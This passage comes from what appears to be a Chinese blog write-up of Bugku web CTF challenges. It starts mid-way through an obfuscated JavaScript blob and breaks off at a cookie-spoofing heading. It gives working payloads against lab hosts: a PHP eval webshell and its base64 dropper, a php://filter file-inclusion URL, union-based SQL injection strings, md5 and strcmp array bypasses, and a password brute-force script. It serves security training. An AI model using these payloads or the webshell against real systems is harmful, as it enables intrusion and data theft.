]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]])</span><br></pre></td></tr></table></figure><p>在chrome console 运行。题目说字母大写。<code>CTF{WHATFK}</code></p><h4 id="WEB4"><a href="#WEB4" class="headerlink" title="WEB4"></a>WEB4</h4><blockquote><p>看看源代码吧</p><p><a href="http://120.24.86.145:8002/web4/" target="_blank" rel="noopener">http://120.24.86.145:8002/web4/</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="string">'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">'%35%34%61%61%32'</span> + p2));</span><br></pre></td></tr></table></figure><p>在chrome console 运行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="string">'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'</span>;</span><br><span class="line"><span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">'%35%34%61%61%32'</span> + p2);</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> a=<span class="built_in">document</span>.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=<span class="keyword">typeof</span> a)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line"><span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">alert(<span class="string">"Error"</span>);</span><br><span class="line">a.focus();<span class="keyword">return</span>!<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure><p>填入<code>67d709b2b54aa2aa648cf6e87a7114f1</code>  。<code>KEY{J22JK-HS11}</code></p><h4 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h4><blockquote><p> <a href="http://120.24.86.145:8005/post/" target="_blank" rel="noopener">http://120.24.86.145:8005/post/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用php的filter读取源码</span></span><br><span class="line"><span class="comment">//http://120.24.86.145:8005/post/index.php?file=php://filter/convert.base64-encode/resource=index.php</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="phpcmsV9"><a href="#phpcmsV9" class="headerlink" title="phpcmsV9"></a>phpcmsV9</h4><blockquote><p>一个靶机而已，别搞破坏。<br>多谢各位大侠手下留情，flag在根目录里txt文件里<br><a href="http://120.24.86.145:8001/" target="_blank" rel="noopener">http://120.24.86.145:8001/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网站已经浑身是马了,随意找一个</span><br><span class="line"><span class="comment">//view-source:http://120.24.86.145:8001/html/special/test000/</span></span><br><span class="line"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">'tiny.php'</span>,base64_decode(<span class="string">'PD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg=='</span>)); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//<span class="meta">&lt;?php</span> @eval($_POST[pass]);<span class="meta">?&gt;</span></span></span><br><span class="line">菜刀连上后拿到一张[flag.jpg](http:<span class="comment">//120.24.86.145:8001/flag.jpg)，</span></span><br><span class="line">图片末尾隐藏有字符串 flag&#123;admin_a23-ae2132_key&#125;</span><br></pre></td></tr></table></figure><h4 id="海洋CMS"><a href="#海洋CMS" class="headerlink" title="海洋CMS"></a>海洋CMS</h4><blockquote><p>地址：<a href="http://120.24.86.145:8008/" target="_blank" rel="noopener">http://120.24.86.145:8008/</a></p><p>flag在根目录某个txt里</p></blockquote><p>扫到flag.php，flag{felege-ctf-2017_04}。</p><h4 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h4><blockquote><p><a href="http://120.24.86.145:8002/baopo/" target="_blank" rel="noopener">http://120.24.86.145:8002/baopo/</a></p><p>作者：Se7en</p></blockquote><p>直说爆破了，用burp的intruder，Payload Position选<code>pwd=§1§§1§§1§§1§§1§</code> ，Attack Type选Cluster bomb，payload option选数字，共十万种可能，慢慢等。也可以写个小脚本跑跑。最后密码是13579。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> requests,itertools,string</span><br><span class="line">u=<span class="string">"http://120.24.86.145:8002/baopo/"</span></span><br><span class="line">d=string.digits</span><br><span class="line">req=requests.session()</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(d,d,d,d,d):</span><br><span class="line">data=&#123;<span class="string">"pwd"</span>:<span class="string">''</span>.join(i)&#125;</span><br><span class="line">r=req.post(u,data=data)</span><br><span class="line">cnt=cnt+<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"密码不正确"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"correct,"</span>,data</span><br><span class="line"><span class="keyword">if</span> cnt%<span class="number">1000</span>==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> cnt</span><br></pre></td></tr></table></figure><p><code>flag{bugku-baopo-hah}</code> </p><h4 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h4><blockquote><p><a href="http://47.93.190.246:49162/" target="_blank" rel="noopener">http://47.93.190.246:49162/</a><br>flag格式：SKCTF{xxxxxxxxxxxxxxxxxx}</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://47.93.190.246:49162/code.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://47.93.190.246:49162/?v1[]=&amp;v2[]=1&amp;v3[]=</code></p><p>向md5()或strcmp()传入数组会返回null，null为假。</p><p><code>SKCTF{Php_1s_tH3_B3St_L4NgUag3}</code> </p><h4 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h4><blockquote><p><a href="http://120.24.86.145:9001/test/" target="_blank" rel="noopener">http://120.24.86.145:9001/test/</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> clicks=<span class="number">0</span></span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      $(<span class="string">"#cookie"</span>)</span><br><span class="line">        .mousedown(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          $(<span class="keyword">this</span>).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        .mouseup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          $(<span class="keyword">this</span>).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">          clicks++;</span><br><span class="line">          $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">          <span class="keyword">if</span>(clicks &gt;= <span class="number">1000000</span>)&#123;</span><br><span class="line">          <span class="keyword">var</span> form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>JavaScript代码表示当clicks大于1M时post一个数据包，所以直接post <code>clicks=1000001</code> 得到<code>flag{Not_C00kI3Cl1ck3r}</code>  。</p><h4 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h4><blockquote><p><a href="http://120.24.86.145:8002/web16/" target="_blank" rel="noopener">http://120.24.86.145:8002/web16/</a></p><p>听说备份是个好习惯</p></blockquote><p>扫到index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>http://120.24.86.145:8002/web16/?kkeyey1[]&amp;kkeyey2[]=1</code> 得到<code>Bugku{OH_YOU_FIND_MY_MOMY}</code> </p><h4 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h4><blockquote><p>快来查查成绩吧<br><a href="http://120.24.86.145:8002/chengjidan/" target="_blank" rel="noopener">http://120.24.86.145:8002/chengjidan/</a></p></blockquote><p>简单的sql注入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">url:http://120.24.86.145:8002/chengjidan/index.php</span><br><span class="line">post:</span><br><span class="line">id=2' and 1=0 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line">//fl4g,sc</span><br><span class="line"></span><br><span class="line">id=2' and 1=0 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c3467#</span><br><span class="line">//skctf_flag</span><br><span class="line"></span><br><span class="line">id=2' and 1=0 union select 1,2,3,skctf_flag from fl4g#</span><br><span class="line">//BUGKU&#123;Sql_INJECT0N_4813drd8hz4&#125;</span><br></pre></td></tr></table></figure><h4 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h4><blockquote><p><a href="http://120.24.86.145:8002/qiumingshan/" target="_blank" rel="noopener">http://120.24.86.145:8002/qiumingshan/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line">u=<span class="string">"http://120.24.86.145:8002/qiumingshan/"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">res=eval(re.findall(<span class="string">"&lt;div&gt;(.*)="</span>,r.get(u).content)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">print</span> r.post(u,data=&#123;<span class="string">"value"</span>:str(res)&#125;).content</span><br><span class="line"><span class="comment"># 原来你也是老司机 Bugku&#123;YOU_DID_IT_BY_SECOND&#125;</span></span><br></pre></td></tr></table></figure><h4 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h4><blockquote><p>速度要快！！！！！！</p><p><a href="http://120.24.86.145:8002/web6/" target="_blank" rel="noopener">http://120.24.86.145:8002/web6/</a></p><p>格式KEY{xxxxxxxxxxxxxx}</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">抓包发现响应头有额外键值对</span><br><span class="line">flag: 6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogT1RjeU5EYzQ=</span><br><span class="line">值解码后为 跑的还不错，给你flag吧: NjE0NzY4</span><br><span class="line">响应包内容如下</span><br><span class="line"><span class="tag">&lt;/<span class="name">br</span>&gt;</span>我感觉你得快点!!!<span class="comment">&lt;!-- OK ,now you have to post the margin what you find --&gt;</span></span><br></pre></td></tr></table></figure><p>要留意保持session。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">ses=requests.session()</span><br><span class="line">r = ses.get(url)</span><br><span class="line">key = base64.b64decode(base64.b64decode(r.headers[<span class="string">'flag'</span>]).split(<span class="string">' '</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> ses.post(url, data=&#123;<span class="string">'margin'</span>: key&#125;).content</span><br><span class="line"><span class="comment">#KEY&#123;111dd62fcd377076be18a&#125;</span></span><br></pre></td></tr></table></figure><h4 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h4><blockquote><p><a href="http://120.24.86.145:8002/web11/" target="_blank" 